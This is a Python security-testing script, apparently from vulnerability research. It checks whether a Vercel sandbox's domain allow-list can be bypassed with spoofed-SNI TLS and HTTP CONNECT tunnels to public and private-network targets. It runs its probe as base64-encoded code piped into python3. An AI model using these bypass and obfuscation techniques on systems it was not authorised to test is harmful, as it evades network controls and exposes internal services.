# -*- coding: utf-8 -*-
"""CONNECT 方法隧道测试: 防火墙代理是否支持 CONNECT -> 任意 TCP 隧道?
custom allow httpbin.org 下, TLS 连接 (SNI=httpbin.org) 通道内发 CONNECT:
  K1 CONNECT 8.8.8.8:53   公网目标 (隧道?)
  K2 CONNECT 172.31.0.2:5432 私有网段 (隧道+D线?)
  K3 CONNECT 1.1.1.1:443  公网 TLS 目标
  K4 CONNECT httpbin.org:443 (allow 域名自身)
  若 200 Connection Established -> 后续数据转发到目标 -> 任意 TCP 隧道 = Critical
"""
import base64, json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('npol1 sid:', sid, 'status:', d['sandbox']['status'], flush=True)
if d['sandbox'].get('status') != 'running':
    c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s&resume=true' % (TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    print('resumed sid:', sid, flush=True)
    time.sleep(5)

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

# 恢复 custom + allow httpbin.org
api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM),
    {"mode": "custom", "allowedDomains": ["httpbin.org"]})
time.sleep(3)

CONNECT_CODE = '''import socket, ssl, sys, struct, time
target = sys.argv[1]
try:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(socket.create_connection(('1.1.1.1', 443), timeout=6), server_hostname='httpbin.org')
    # CONNECT 请求
    req = ('CONNECT %s HTTP/1.1\\r\\nHost: %s\\r\\n\\r\\n' % (target, target)).encode()
    s.sendall(req)
    s.settimeout(5)
    d = s.recv(1024)
    print('CONNECT_RESP', repr(d[:200]))
    if b'200' in d[:50]:
        # 隧道建立 -> 发 DNS 查询 (TCP) 到目标:53 或 PG 到 :5432
        port = int(target.split(':')[1])
        if port == 53:
            hdr = struct.pack('!HHHHHH', 0x1234, 0x0100, 1, 0, 0, 0)
            q = b'\\x07example\\x03com\\x00' + struct.pack('!HH', 1, 1)
            s.sendall(hdr + q)
            r2 = s.recv(512)
            print('TUNNEL_DATA', len(r2), r2[:40])
        elif port == 5432:
            s.sendall(struct.pack('!II', 8, 80877103))
            time.sleep(1)
            r2 = s.recv(16)
            print('TUNNEL_PG', r2)
        else:
            s.sendall(b'HEAD / HTTP/1.0\\r\\n\\r\\n')
            r2 = s.recv(200)
            print('TUNNEL_DATA', repr(r2[:100]))
except Exception as e:
    print('ERR', type(e).__name__, str(e)[:80])
'''

for target, tag in [
    ('8.8.8.8:53',       'K1-pub-DNS'),
    ('172.31.0.2:5432',  'K2-vpc-PG'),
    ('1.1.1.1:443',      'K3-pub-TLS'),
    ('httpbin.org:443',  'K4-allow-self'),
]:
    b64 = base64.b64encode(CONNECT_CODE.encode()).decode()
    sc = 'echo %s | base64 -d | python3 - %s' % (b64, target)
    c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=40000)
    out = parse_data(r).strip()
    print('[%s] %s' % (tag, out[:250]), flush=True)

print('=== CONNECT DONE ===', flush=True)
